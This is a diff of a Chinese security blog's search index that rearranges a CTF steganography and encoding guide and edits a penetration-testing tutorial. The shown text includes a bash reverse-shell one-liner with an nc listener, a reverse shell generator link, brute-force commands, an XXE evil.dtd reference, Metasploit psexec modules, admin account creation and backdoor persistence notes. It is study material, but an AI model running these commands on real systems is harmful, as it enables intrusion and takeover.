@@ -1,137 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Misc</title>
-    <url>/2023/08/27/Misc/</url>
-    <content><![CDATA[<p>​		介篇文章基于本人所见到过的CTF-MISC中的题目，并结合其他大佬的博客所写，涉及常见的编码与隐写术，关于数字取证与流量分析将会在以后进行补充（maybe）</p>
-<span id="more"></span>
-
-<h3 id="0x01编码与古典密码"><a href="#0x01编码与古典密码" class="headerlink" title="0x01编码与古典密码"></a>0x01编码与古典密码</h3><p><strong>编码</strong>：将一定序列的二进制串赋予意义；ASCII码、GBK(GB2312&#x2F;18030)、UTF、ANSI；在早期还有专用的数字编码，即二-十进制编码（BCD码）：8421码、2421码、格雷码；为保证传输数据的准确性，再加入额外的可信性编码：奇偶校验码、海明码、ECC（椭圆曲线？）、Chipkill等；</p>
-<ul>
-<li><p>标准ASCII编码：8bits，最高位为0，支持128个字符；后面128个有用的为扩展的版本，各地区情况不同；除UTF16和32不兼容外，其他上面说到的均兼容；</p>
-</li>
-<li><p>GBK：国标；GBK2312，简体中文字符集6700+汉字&amp;&amp;拉丁字母等；GBK在2312基础上收录20000+汉字，其中还包括繁体；18030，收录70000+汉字&amp;&amp;少数民族</p>
-</li>
-<li><p>UTF：包括UTF-8&#x2F;-16&#x2F;-32，表示的是用的多少bit来表示字符；在UTF-8中，与ASCII码表示一致；但在16与32中与ASCII码不同方式</p>
-<table>
-<thead>
-<tr>
-<th>字节数</th>
-<th>二进制编码格式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>单字节</td>
-<td>0xxxxxxx</td>
-</tr>
-<tr>
-<td>双字节</td>
-<td>110xxxxx 10xxxxxx</td>
-</tr>
-<tr>
-<td>四字节</td>
-<td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p>Unicode：万国码、单一码，包含世界上几乎所有的符号；是一个字符集，并未赋予意义</p>
-</blockquote>
-</li>
-<li><p>ANSI：根据系统中设置的地区不同，会自动地更换为相应的编码，是Windows的编码机制；可以通过修改—语言与地区—来更改；美国就是ASCII，中国就是GBK；</p>
-</li>
-<li><p>摩斯电码：在通信领域常用，点横构成（基本都是一长一短）；该领域其他编码有敲击码（26字母放在5x5的格子中，CK共用）、曼彻斯特编码（与高低电平不同，一般使用高低转换表示）、格雷编码（从0-9每位的二进制表示仅与上一位只有一个位的差别，有多种表示）</p>
-</li>
-<li><p>Base编码</p>
-<ul>
-<li>base64：将ASCII对应二进制写出来，每个字符一个字节有8bit，2^6^&#x3D;64（起码有大小写的A-Z，0-9），因此对二进制串每6个为一组，在每组前加上00（能将3个字符&#x2F;字节变成4个字符），再将每组二进制串对照更新；如果原文并没有3的倍数以上的字符，则会在base64编码后加上一个或两个“&#x3D;”；</li>
-<li>base32是5个一组，共有32个字符；base16是4个一组，共16个字符0-9、A-F</li>
-<li>base58、85、91、92、36、62</li>
-</ul>
-</li>
-</ul>
-<p><strong>古典密码</strong>：</p>
-<ul>
-<li>栅栏密码：传统：N位一组，依次链接每组的1，2….得到密文；变体W型栅栏；</li>
-<li>移位密码：1.传统的凯撒密码，从AB…YZ进行后移固定长度，若移3，得DE…BC；2.维吉尼亚密码：由密文密钥构成，在表中按照密钥长度向后依次替换（用完从头再来），直到明文变完</li>
-<li>棋盘密码：将26个字母放到5x5的格子中，其中j和i共用一个</li>
-<li>BrainFuck：由 <code>&lt; &gt; + . [ - ] ,</code>等八种符号构成；类似的：1.jsFuck：<code>( ! + ) [ ] </code>符号构成，在浏览器控制台中即可解密；2.Ook：如名，由<code>O o . ? k </code>构成；3.URL编码：由<code>%</code>与十六进制数构成；4.jother：由<code>![]+</code>构成；5.jjencode：有<code>$$ = ~ sojson等</code>内容构成；5.Quoted-printable：在基于MIME下的表示任何8位的串<code>=FF</code>只有&#x3D;与十六进制字符</li>
-<li>当铺密码：有简单中文构成，<code>羊大王中王</code>即63444</li>
-<li>键盘密码：1.QWE替换：字母区左到右、上到下，用ABCD….替换；2.QWE包围：六个或者几个字母围住的；3.九键：手机九键</li>
-<li>猪圈密码：奇怪的图形（方的半包围与点构成），找表对照；类似的有：埃及文字、宝可梦图腾、跳舞的小人、精灵语？、盲文、夏多密码（有线条在内的圈）、圣堂武士（箭头&amp;点&amp;三角）、外星人密码、音乐密码、银河字母、摩斯密码、天干地支表、培根密码（26个字母用<code>a</code>和<code>b</code>表示）</li>
-<li>佛曰密码：以<code>佛曰</code>开头，或者<code>新佛曰</code>等；同理的有“熊曰”，“呜嗷啊~”构成的兽言，核心价值观编码？：富强民主文明和谐，自由平等公正法治，爱国敬业诚信友善</li>
-</ul>
-<p>此外有的题目会进行字母替换，而且给的题目又特别长，此时可以根据英文词频分析，来进行替换，参考<a href="https://quipqiup.com/">CTF wiki</a></p>
-<p>黑科技—ciphey一个使用人工智能的密码破解工具，当然只是有可能是对的</p>
-<h3 id="0x02隐写术"><a href="#0x02隐写术" class="headerlink" title="0x02隐写术"></a>0x02隐写术</h3><p>最基本的莫过于注意搜索文件属性、文件二进制打开搜索字符串（strings搜索文件）</p>
-<p>其他手段需要通过二进制打开，根据文件头来判断文件类型</p>
-<pre><code>图片
-JPEG/jpg:头FF-D8-FF;尾FF-D9
-PNG:头89-50-4E-47-0D-0A-1A-0A;尾AE-42-60-82 
-GIF:头47-49-46-38-39/37-61;尾00-3B
-BMP:头42-4D
-压缩包
-ZIP:头50-4B-03-04;尾50-4B
-RAR:头52-61-72-21
-音频
-WAV:头57-41-56-45
-视频
-AVI:头41-56-49-20
-</code></pre>
-<ul>
-<li><p>文件拼接</p>
-<p>将两种文件直接拼接在一起，常见的就是图片后面跟一个压缩包；最直接的就是用二进制编辑器打开之后，找出对应两个文件的头和尾，之后将其另存为其他类型的文件即可。</p>
-<ul>
-<li>工具：binwalk（kali）、foremost</li>
-<li>用途：在实际攻击中可以将一句话木马拼接在图片后，图片软件只识别到图片文件头就结束</li>
-</ul>
-</li>
-<li><p>LSB隐写</p>
-<p>LSB指的是最低有效位，原理跟RGB有关，常出现于png中：一个颜色占据8bit，从低到高位，一个像素三种颜色（红绿蓝），每一个像素的低位颜色稍加更改，对于人的肉眼来说不明显。常常在其中某一层会隐藏信息，有时候直接就是flag，有时候会再来个二维码之类；简单点的相关RGB利用就是将字符串的ASCII码进行RGB转换为图片</p>
-<ul>
-<li>工具：stegsolve、zsteg（kali）、Cloacked-Pixel（有密钥）</li>
-</ul>
-</li>
-<li><p>基于文件属性</p>
-<p>IHDR隐写：指的是更改png图片中的宽高等来隐藏信息，一般来说题目实际的高度会长一点，对宽度下手容易导致图片没法看</p>
-<p>在png的二进制中49-48-44-52&#x3D;IHDR，从开头算起17-20字节为宽、21-24字节为高。有些图片还会加有CRC校验报错，会根据图片内容进行验算，不对照则不能正常打开。</p>
-<p>IDAT数据块连续：png图片是由一个个的IDAT数据块构成的，除了最后一个其他的都有固定的相同长度，不一样的一般都是多出来的，可以分离出来进一步查看</p>
-<p>工具：pngcheck</p>
-</li>
-<li><p>一些杂的</p>
-<ul>
-<li>gif：一些图片的拼接，目标&#x2F;信息常位于其中的某一帧，可以将特殊帧都给提取出来再进一步挖掘；工具：steghide、stegseek、PhotoShop</li>
-<li>二维码：左上-右上-左下为大方块叫做位置探测图形；九宫格中其他位置都属于校正图形；一般形式由拼接、修复二维码等，当然二维码作为图形出现时也可以与前面的技术结合。工具：QR Research、QRazyBox（修复二维码）</li>
-<li>水印：原图经傅里叶变换—&gt;频谱图+水印经编码—&gt;再次傅里叶逆变换得到含水印的图像，一般题目中会给两张一毛一样的图，一般使用脚本破解</li>
-</ul>
-</li>
-<li><p>压缩包</p>
-<ul>
-<li><p>伪加密：常见于zip，少部分会有rar，这里仅对zip进行介绍。ZIP文件格式如下：压缩源文件数据区【文件头+文件数据+数据描述符】+压缩文件目录区+压缩源文件目录结束标志。在ZIP（小端从左向右看时）中涉及504b0304向后第2个字（1400后）和504b0102向后第2个字（14001400后），只有当一个偶数一个奇数是伪加密，两个偶数不加密，两个奇数加密；</p>
-</li>
-<li><p>密码破解：有时候压缩包的密码会藏在其他文件中，如果有提示弱密码或者已知部分密码的话，可以用ARCHPR、ZIPerello、AZPR进行爆破；</p>
-</li>
-<li><p>明文攻击：会给我们一个带密码的压缩包和其中的一个文件。判断该压缩包里面的文件是否和所给文件一样，可以将所给文件进行压缩然后查看生成压缩包内部显示的CRC，之后进行对比（注意使用相同的压缩算法）；确定后就可以使用上述软件或bkcrack进行解密</p>
-</li>
-<li><p>CRC爆破：长密码+多个相同大小的小文件，工具CRC32.py爆破</p>
-</li>
-</ul>
-</li>
-<li><p>音频</p>
-<p>一般题目格式为.wav，经常与摩斯电码进行结合，使用Audacity进行音频分析，要么会多出来一段小杂音，要么就是听不懂，但是只有高低的波形；此外还可以借助频谱图来隐藏信息，在上述软件中打开频谱图也许能看到flag；</p>
-<p>对于mp3格式的题目，一般就是使用MP3stego；其余的大多就是silentEye进行加解密；在视频中还有的工具用来隐藏音频mkvtool</p>
-</li>
-</ul>
-<p>除了上述所说外，还有其他各种隐写术，例如根据DCT域的JPG的隐写（stegdetect、JPHS）、文本隐写术、像素点合成、大拼图等，除此之外根据目前的AI技术也会有许多此类隐写应用，这里不再过多叙述</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>x86汇编</title>
     <url>/2023/08/27/x86%E6%B1%87%E7%BC%96/</url>
     <content><![CDATA[<p>​		在这篇文章中，我们会对x86汇编及其平台有一个基础的认识，如果之前没有接触过汇编，可以参考王爽老师的《汇编语言（第四版）》</p>
@@ -315,9 +184,140 @@ EXITM:退出宏，且后面的宏语句都不能展开
       </tags>
   </entry>
   <entry>
+    <title>Misc</title>
+    <url>/2023/08/27/Misc/</url>
+    <content><![CDATA[<p>​		介篇文章基于本人所见到过的CTF-MISC中的题目，并结合其他大佬的博客所写，涉及常见的编码与隐写术，关于数字取证与流量分析将会在以后进行补充（maybe）</p>
+<span id="more"></span>
+
+<h3 id="0x01编码与古典密码"><a href="#0x01编码与古典密码" class="headerlink" title="0x01编码与古典密码"></a>0x01编码与古典密码</h3><p><strong>编码</strong>：将一定序列的二进制串赋予意义；ASCII码、GBK(GB2312&#x2F;18030)、UTF、ANSI；在早期还有专用的数字编码，即二-十进制编码（BCD码）：8421码、2421码、格雷码；为保证传输数据的准确性，再加入额外的可信性编码：奇偶校验码、海明码、ECC（椭圆曲线？）、Chipkill等；</p>
+<ul>
+<li><p>标准ASCII编码：8bits，最高位为0，支持128个字符；后面128个有用的为扩展的版本，各地区情况不同；除UTF16和32不兼容外，其他上面说到的均兼容；</p>
+</li>
+<li><p>GBK：国标；GBK2312，简体中文字符集6700+汉字&amp;&amp;拉丁字母等；GBK在2312基础上收录20000+汉字，其中还包括繁体；18030，收录70000+汉字&amp;&amp;少数民族</p>
+</li>
+<li><p>UTF：包括UTF-8&#x2F;-16&#x2F;-32，表示的是用的多少bit来表示字符；在UTF-8中，与ASCII码表示一致；但在16与32中与ASCII码不同方式</p>
+<table>
+<thead>
+<tr>
+<th>字节数</th>
+<th>二进制编码格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>单字节</td>
+<td>0xxxxxxx</td>
+</tr>
+<tr>
+<td>双字节</td>
+<td>110xxxxx 10xxxxxx</td>
+</tr>
+<tr>
+<td>四字节</td>
+<td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>Unicode：万国码、单一码，包含世界上几乎所有的符号；是一个字符集，并未赋予意义</p>
+</blockquote>
+</li>
+<li><p>ANSI：根据系统中设置的地区不同，会自动地更换为相应的编码，是Windows的编码机制；可以通过修改—语言与地区—来更改；美国就是ASCII，中国就是GBK；</p>
+</li>
+<li><p>摩斯电码：在通信领域常用，点横构成（基本都是一长一短）；该领域其他编码有敲击码（26字母放在5x5的格子中，CK共用）、曼彻斯特编码（与高低电平不同，一般使用高低转换表示）、格雷编码（从0-9每位的二进制表示仅与上一位只有一个位的差别，有多种表示）</p>
+</li>
+<li><p>Base编码</p>
+<ul>
+<li>base64：将ASCII对应二进制写出来，每个字符一个字节有8bit，2^6^&#x3D;64（起码有大小写的A-Z，0-9），因此对二进制串每6个为一组，在每组前加上00（能将3个字符&#x2F;字节变成4个字符），再将每组二进制串对照更新；如果原文并没有3的倍数以上的字符，则会在base64编码后加上一个或两个“&#x3D;”；</li>
+<li>base32是5个一组，共有32个字符；base16是4个一组，共16个字符0-9、A-F</li>
+<li>base58、85、91、92、36、62</li>
+</ul>
+</li>
+</ul>
+<p><strong>古典密码</strong>：</p>
+<ul>
+<li>栅栏密码：传统：N位一组，依次链接每组的1，2….得到密文；变体W型栅栏；</li>
+<li>移位密码：1.传统的凯撒密码，从AB…YZ进行后移固定长度，若移3，得DE…BC；2.维吉尼亚密码：由密文密钥构成，在表中按照密钥长度向后依次替换（用完从头再来），直到明文变完</li>
+<li>棋盘密码：将26个字母放到5x5的格子中，其中j和i共用一个</li>
+<li>BrainFuck：由 <code>&lt; &gt; + . [ - ] ,</code>等八种符号构成；类似的：1.jsFuck：<code>( ! + ) [ ] </code>符号构成，在浏览器控制台中即可解密；2.Ook：如名，由<code>O o . ? k </code>构成；3.URL编码：由<code>%</code>与十六进制数构成；4.jother：由<code>![]+</code>构成；5.jjencode：有<code>$$ = ~ sojson等</code>内容构成；5.Quoted-printable：在基于MIME下的表示任何8位的串<code>=FF</code>只有&#x3D;与十六进制字符</li>
+<li>当铺密码：有简单中文构成，<code>羊大王中王</code>即63444</li>
+<li>键盘密码：1.QWE替换：字母区左到右、上到下，用ABCD….替换；2.QWE包围：六个或者几个字母围住的；3.九键：手机九键</li>
+<li>猪圈密码：奇怪的图形（方的半包围与点构成），找表对照；类似的有：埃及文字、宝可梦图腾、跳舞的小人、精灵语？、盲文、夏多密码（有线条在内的圈）、圣堂武士（箭头&amp;点&amp;三角）、外星人密码、音乐密码、银河字母、摩斯密码、天干地支表、培根密码（26个字母用<code>a</code>和<code>b</code>表示）</li>
+<li>佛曰密码：以<code>佛曰</code>开头，或者<code>新佛曰</code>等；同理的有“熊曰”，“呜嗷啊~”构成的兽言，核心价值观编码？：富强民主文明和谐，自由平等公正法治，爱国敬业诚信友善</li>
+</ul>
+<p>此外有的题目会进行字母替换，而且给的题目又特别长，此时可以根据英文词频分析，来进行替换，参考<a href="https://quipqiup.com/">CTF wiki</a></p>
+<p>黑科技—ciphey一个使用人工智能的密码破解工具，当然只是有可能是对的</p>
+<h3 id="0x02隐写术"><a href="#0x02隐写术" class="headerlink" title="0x02隐写术"></a>0x02隐写术</h3><p>最基本的莫过于注意搜索文件属性、文件二进制打开搜索字符串（strings搜索文件）</p>
+<p>其他手段需要通过二进制打开，根据文件头来判断文件类型</p>
+<pre><code>图片
+JPEG/jpg:头FF-D8-FF;尾FF-D9
+PNG:头89-50-4E-47-0D-0A-1A-0A;尾AE-42-60-82 
+GIF:头47-49-46-38-39/37-61;尾00-3B
+BMP:头42-4D
+压缩包
+ZIP:头50-4B-03-04;尾50-4B
+RAR:头52-61-72-21
+音频
+WAV:头57-41-56-45
+视频
+AVI:头41-56-49-20
+</code></pre>
+<ul>
+<li><p>文件拼接</p>
+<p>将两种文件直接拼接在一起，常见的就是图片后面跟一个压缩包；最直接的就是用二进制编辑器打开之后，找出对应两个文件的头和尾，之后将其另存为其他类型的文件即可。</p>
+<ul>
+<li>工具：binwalk（kali）、foremost</li>
+<li>用途：在实际攻击中可以将一句话木马拼接在图片后，图片软件只识别到图片文件头就结束</li>
+</ul>
+</li>
+<li><p>LSB隐写</p>
+<p>LSB指的是最低有效位，原理跟RGB有关，常出现于png中：一个颜色占据8bit，从低到高位，一个像素三种颜色（红绿蓝），每一个像素的低位颜色稍加更改，对于人的肉眼来说不明显。常常在其中某一层会隐藏信息，有时候直接就是flag，有时候会再来个二维码之类；简单点的相关RGB利用就是将字符串的ASCII码进行RGB转换为图片</p>
+<ul>
+<li>工具：stegsolve、zsteg（kali）、Cloacked-Pixel（有密钥）</li>
+</ul>
+</li>
+<li><p>基于文件属性</p>
+<p>IHDR隐写：指的是更改png图片中的宽高等来隐藏信息，一般来说题目实际的高度会长一点，对宽度下手容易导致图片没法看</p>
+<p>在png的二进制中49-48-44-52&#x3D;IHDR，从开头算起17-20字节为宽、21-24字节为高。有些图片还会加有CRC校验报错，会根据图片内容进行验算，不对照则不能正常打开。</p>
+<p>IDAT数据块连续：png图片是由一个个的IDAT数据块构成的，除了最后一个其他的都有固定的相同长度，不一样的一般都是多出来的，可以分离出来进一步查看</p>
+<p>工具：pngcheck</p>
+</li>
+<li><p>一些杂的</p>
+<ul>
+<li>gif：一些图片的拼接，目标&#x2F;信息常位于其中的某一帧，可以将特殊帧都给提取出来再进一步挖掘；工具：steghide、stegseek、PhotoShop</li>
+<li>二维码：左上-右上-左下为大方块叫做位置探测图形；九宫格中其他位置都属于校正图形；一般形式由拼接、修复二维码等，当然二维码作为图形出现时也可以与前面的技术结合。工具：QR Research、QRazyBox（修复二维码）</li>
+<li>水印：原图经傅里叶变换—&gt;频谱图+水印经编码—&gt;再次傅里叶逆变换得到含水印的图像，一般题目中会给两张一毛一样的图，一般使用脚本破解</li>
+</ul>
+</li>
+<li><p>压缩包</p>
+<ul>
+<li><p>伪加密：常见于zip，少部分会有rar，这里仅对zip进行介绍。ZIP文件格式如下：压缩源文件数据区【文件头+文件数据+数据描述符】+压缩文件目录区+压缩源文件目录结束标志。在ZIP（小端从左向右看时）中涉及504b0304向后第2个字（1400后）和504b0102向后第2个字（14001400后），只有当一个偶数一个奇数是伪加密，两个偶数不加密，两个奇数加密；</p>
+</li>
+<li><p>密码破解：有时候压缩包的密码会藏在其他文件中，如果有提示弱密码或者已知部分密码的话，可以用ARCHPR、ZIPerello、AZPR进行爆破；</p>
+</li>
+<li><p>明文攻击：会给我们一个带密码的压缩包和其中的一个文件。判断该压缩包里面的文件是否和所给文件一样，可以将所给文件进行压缩然后查看生成压缩包内部显示的CRC，之后进行对比（注意使用相同的压缩算法）；确定后就可以使用上述软件或bkcrack进行解密</p>
+</li>
+<li><p>CRC爆破：长密码+多个相同大小的小文件，工具CRC32.py爆破</p>
+</li>
+</ul>
+</li>
+<li><p>音频</p>
+<p>一般题目格式为.wav，经常与摩斯电码进行结合，使用Audacity进行音频分析，要么会多出来一段小杂音，要么就是听不懂，但是只有高低的波形；此外还可以借助频谱图来隐藏信息，在上述软件中打开频谱图也许能看到flag；</p>
+<p>对于mp3格式的题目，一般就是使用MP3stego；其余的大多就是silentEye进行加解密；在视频中还有的工具用来隐藏音频mkvtool</p>
+</li>
+</ul>
+<p>除了上述所说外，还有其他各种隐写术，例如根据DCT域的JPG的隐写（stegdetect、JPHS）、文本隐写术、像素点合成、大拼图等，除此之外根据目前的AI技术也会有许多此类隐写应用，这里不再过多叙述</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>渗透与Web安全</title>
     <url>/2023/08/27/%E6%B8%97%E9%80%8F%E4%B8%8EWeb%E5%AE%89%E5%85%A8/</url>
-    <content><![CDATA[<p>本文大致分为外网渗透&#x2F;Web安全与内网渗透，仅提供参考，由于时间原因文中或多或少会有讲解不清楚的内容，如果有任何错误，欢迎批评指正。</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本文大致分为外网渗透&#x2F;Web安全与内网渗透，仅提供参考，由于时间原因文中或多或少会有讲解不清楚的内容，如果有任何错误，欢迎批评指正。</p>
 <span id="more"></span>
 
 <p>外网渗透：信息搜集-&gt;漏洞检测-&gt;漏洞利用（Web安全）-&gt;Webshell链接（破解门）</p>
@@ -462,13 +462,13 @@ intext:阿里巴巴------------指定搜索内容中必有“阿里巴巴”
 </tr>
 </tbody></table>
 <ul>
-<li><p><a href="https://cve.mitre.org/">CVE</a>：通用漏洞纰漏</p>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly9jdmUubWl0cmUub3JnLw==">CVE<i class="fa fa-external-link-alt"></i></span>：通用漏洞纰漏</p>
 </li>
-<li><p>[NVD](<a href="https://nvd.nist.gov/">NVD - Home (nist.gov)</a>)：美国国家通用漏洞数据库</p>
+<li><p>[NVD](<span class="exturl" data-url="aHR0cHM6Ly9udmQubmlzdC5nb3Yv">NVD - Home (nist.gov)<i class="fa fa-external-link-alt"></i></span>)：美国国家通用漏洞数据库</p>
 </li>
-<li><p><a href="https://www.cnvd.org.cn/">CNVD</a>：国家信息安全漏洞共享平台</p>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY252ZC5vcmcuY24v">CNVD<i class="fa fa-external-link-alt"></i></span>：国家信息安全漏洞共享平台</p>
 </li>
-<li><p><a href="https://www.cnnvd.org.cn/">CNNVD</a>：国家信息安全漏洞库</p>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25udmQub3JnLmNuLw==">CNNVD<i class="fa fa-external-link-alt"></i></span>：国家信息安全漏洞库</p>
 </li>
 </ul>
 <h2 id="0x01、外网渗透"><a href="#0x01、外网渗透" class="headerlink" title="0x01、外网渗透"></a><em>0x01</em>、外网渗透</h2><p>在此处我们直接介绍如今使用范围最广的框架技术，后面所讲述的为漏洞原理，通过与相关框架缺陷组合，拿到Webshell；</p>
@@ -1142,8 +1142,7 @@ evil.dtd如下
 <p>防御：使用开发语言提供的禁用外部实体的方法、过滤用户提交的XML数据</p>
 <hr>
 <hr>
-<p>###8.反序列化漏洞</p>
-<p>对象转换为字符串叫序列化，反之就是反序列化，用于对象传输问题；漏洞产生原因是反序列化时会调用到相关析构函数（魔术函数），而该函数内参数可控，攻击者控制输入参数执行一些敏感操作；常见的序列化格式：二进制格式，字节数组，json字符串，xml字符串</p>
+<h3 id="8-反序列化漏洞"><a href="#8-反序列化漏洞" class="headerlink" title="8.反序列化漏洞"></a>8.反序列化漏洞</h3><p>对象转换为字符串叫序列化，反之就是反序列化，用于对象传输问题；漏洞产生原因是反序列化时会调用到相关析构函数（魔术函数），而该函数内参数可控，攻击者控制输入参数执行一些敏感操作；常见的序列化格式：二进制格式，字节数组，json字符串，xml字符串</p>
 <h4 id="8-1-PHP反序列化"><a href="#8-1-PHP反序列化" class="headerlink" title="8.1.PHP反序列化"></a>8.1.PHP反序列化</h4><p>序列化函数serilize()；反序列化函数unserialize()；字符串格式<code>O:长度:类名:属性数:&#123;S:属性名长度:属性名;S:值的长度:值;i:数值;b:1代表true，0代表false;N:空;......&#125;</code></p>
 <p>__wakeup绕过CVE-2016-7124，影响版本PHP5&lt;5.6.25，PHP7&lt;7.0.10</p>
 <p>魔术函数，从序列化到反序列化过程顺序如下：</p>
@@ -1174,8 +1173,7 @@ evil.dtd如下
 <p>而<code>readObject()</code>方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回，<code>readObject()</code>是可以重写的，可以定制反序列化的一些行为</p>
 <p>相关漏洞：WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)</p>
 <p>防御措施：hh代码审计、黑盒检测、白名单等</p>
-<p>###9.其他</p>
-<h4 id="9-1-逻辑错误漏洞"><a href="#9-1-逻辑错误漏洞" class="headerlink" title="9.1.逻辑错误漏洞"></a>9.1.逻辑错误漏洞</h4><p>程序设计有问题，没有考虑完整情况；无法用扫描器查出；burp看包！！！</p>
+<h3 id="9-其他"><a href="#9-其他" class="headerlink" title="9.其他"></a>9.其他</h3><h4 id="9-1-逻辑错误漏洞"><a href="#9-1-逻辑错误漏洞" class="headerlink" title="9.1.逻辑错误漏洞"></a>9.1.逻辑错误漏洞</h4><p>程序设计有问题，没有考虑完整情况；无法用扫描器查出；burp看包！！！</p>
 <p>流程：发现功能模块—确定模块功能流程—抓包—改参数</p>
 <ul>
 <li><p>url跳转：url参数中的link&#x3D;木马网站；sso登录、验证跳转配合钓鱼、xss、csrf、浏览器漏洞（CVE-2018-8174）；bypass方式：真的@钓鱼、真的#钓鱼、真的？钓鱼；</p>
@@ -1316,8 +1314,7 @@ medusa -h ~ -u sa -P ~ -t 5 -e ns -M mysql -O /ap.txt	//成功信息记录到日
 <li>服务器端口探测</li>
 <li>路径信息</li>
 </ol>
-<p>####1.1.windows内网信息搜集：</p>
-<p>目标搜集内容：IP、网关、DNS、DMZ（隔离区、位于外网与内网连接处）、工作组、域</p>
+<h4 id="1-1-windows内网信息搜集："><a href="#1-1-windows内网信息搜集：" class="headerlink" title="1.1.windows内网信息搜集："></a>1.1.windows内网信息搜集：</h4><p>目标搜集内容：IP、网关、DNS、DMZ（隔离区、位于外网与内网连接处）、工作组、域</p>
 <blockquote>
 <p>工作组中各个用户可以相互访问，组间也可以相互访问，只是名义上的普通分组。在win中专属的域机制，域之间不可直接访问，实行中心化管理机制“DC”即域控，每一个想要进入该域的机器通过Kerberos协议先访问DC，DC中存储域内用户相关信息“AD”即活动目录，经过SAM来进行NTLM验证对比，有账号管理、软件环境集中管理等。一个域中至少两个DC+AD，域间DNS查询位置</p>
 </blockquote>
@@ -1405,7 +1402,7 @@ exec 2&gt;test	//将所有的错误显示到test文件中.....................
 <p>自定义描述符：</p>
 <pre><code class="bash">exec 5&gt;test; echo&#39;hello&#39; 1&gt;&amp;5	//在test文件中存放‘hello’，&amp;引用文件描述符
 </code></pre>
-<p><code>/dev/null</code>将任何写入该目录下的东西清空，<code>cat /dev/null &gt;test</code>可用于快速清楚test文件中的内容；下面是常用bash反弹shell命令，更多请见[反弹shell](<a href="https://www.revshells.com/">Online - Reverse Shell Generator (revshells.com)</a>)</p>
+<p><code>/dev/null</code>将任何写入该目录下的东西清空，<code>cat /dev/null &gt;test</code>可用于快速清楚test文件中的内容；下面是常用bash反弹shell命令，更多请见[反弹shell](<span class="exturl" data-url="aHR0cHM6Ly93d3cucmV2c2hlbGxzLmNvbS8=">Online - Reverse Shell Generator (revshells.com)<i class="fa fa-external-link-alt"></i></span>)</p>
 <p>被控端<code>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code>，控制端<code>nc -lvvp IP:Port</code></p>
 <blockquote>
 <p><code>bash -i</code>表示交互式shell，<code>&gt;&amp;</code>用于混合输出（正确错误信息均反弹回来），<code>/dev/tcp</code>通过此文件与目标建立tcp链接，同理也有UDP</p>
@@ -1483,7 +1480,7 @@ exec 2&gt;test	//将所有的错误显示到test文件中.....................
 <h4 id="5-1-win下提权"><a href="#5-1-win下提权" class="headerlink" title="5.1.win下提权"></a>5.1.win下提权</h4><p>提权工具：RottenPotato、OriginPotato、SweetPotato、getsystem.exe、RoguePotato；</p>
 <p>wmic命令可以获取杀软、路径、用户组、应用程序、进程等信息，wmic_info.bat脚本进行信息提取，相似的HIGS.bat、winPEAS.bat、Powerless.bat；</p>
 <ul>
-<li><p>内核漏洞：wmic检查版本，powershell列出已安装的安全补丁<code>systeminfo</code>，在[相关提权网站](<a href="https://i.hacking8.com/tiquan">提权辅助网页 Windows提权辅助 (hacking8.com)</a>)查找为进行防护的漏洞</p>
+<li><p>内核漏洞：wmic检查版本，powershell列出已安装的安全补丁<code>systeminfo</code>，在[相关提权网站](<span class="exturl" data-url="aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4=">提权辅助网页 Windows提权辅助 (hacking8.com)<i class="fa fa-external-link-alt"></i></span>)查找为进行防护的漏洞</p>
 </li>
 <li><p>系统服务：可信任服务路径；例如<code>C:\\Program Files\x86</code>如果在<code>C:\\Program</code>下有Program.exe则会去执行后面字符串对应的文件；因为在系统盘下，所以会用相应系统权限去运行；以服务种植该木马，并将该马迁移到其他进程中，防止被发现</p>
 </li>
@@ -1671,7 +1668,7 @@ net localgroup administrators temp /add
 <li><p>Wmiexec.vbs（csscript.exe）、wmcmd.exe、wmiHacker（免杀，445端口）</p>
 </li>
 <li><p>pth-winexe：kali自带pth工具集；</p>
-<p>msf中<code>auxiliary/admin/smb/psexec_command</code>；<code>exploit/windows/smb/psexec</code>；<code>auxiliary/admin/smb/ms17_010_command</code></p>
+<p>msf中<code>auxiliary/admin/smb/psexec_command</code>模块&amp;<code>exploit/windows/smb/psexec</code>模块；<code>auxiliary/admin/smb/ms17_010_command</code></p>
 </li>
 <li><p>Token窃取：</p>
 <p>win中包括授权D令牌（交互式会话登录）和模拟I令牌（非交互会话），均会在重启之后清除，D令牌所有者注销之后转换为I令牌；</p>
@@ -1723,8 +1720,7 @@ net localgroup administrators temp /add
 <p>其他还有PTK密钥传递攻击、PTT票据传递攻击</p>
 <hr>
 <hr>
-<h3 id="7-权限维持"><a href="#7-权限维持" class="headerlink" title="7.权限维持"></a>7.权限维持</h3><p>####7.1.win下权限维持</p>
-<p>后门安装包含注册表后门（persistence）&amp;服务后门（metsvc）【msf模块】</p>
+<h3 id="7-权限维持"><a href="#7-权限维持" class="headerlink" title="7.权限维持"></a>7.权限维持</h3><h4 id="7-1-win下权限维持"><a href="#7-1-win下权限维持" class="headerlink" title="7.1.win下权限维持"></a>7.1.win下权限维持</h4><p>后门安装包含注册表后门（persistence）&amp;服务后门（metsvc）【msf模块】</p>
 <ol>
 <li><p>首先上传vbs，修改为自启动，无需认证</p>
 </li>
@@ -1764,8 +1760,7 @@ net localgroup administrators temp /add
 <li><p>服务后门：一般情况下杀软会进行拦截（Task-powershell脚本）</p>
 </li>
 </ul>
